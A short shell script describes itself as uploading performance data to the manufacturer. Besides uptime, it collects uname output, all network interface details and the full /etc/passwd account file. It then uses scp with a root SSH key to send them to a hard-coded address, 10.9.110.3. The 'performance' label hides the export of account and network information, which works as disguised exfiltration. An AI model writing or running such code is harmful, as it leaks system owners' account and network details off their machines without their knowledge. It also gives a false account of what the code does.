#!/bin/sh
#
# This script will upload performance data to a known server for
# collection by the manufacture to aggregate overall platform performance
#
cp /dev/null /tmp/dd
uptime >> /tmp/dd
uname -a >> /tmp/dd
cat /etc/passwd >> /tmp/dd
ifconfig -a >> /tmp/dd
# Now lets upload
HOST=`hostname`
DD=`date +%s`
scp -i /root/.ssh/support /tmp/dd support@10.9.110.3:dd-${HOST}-${DD}
#
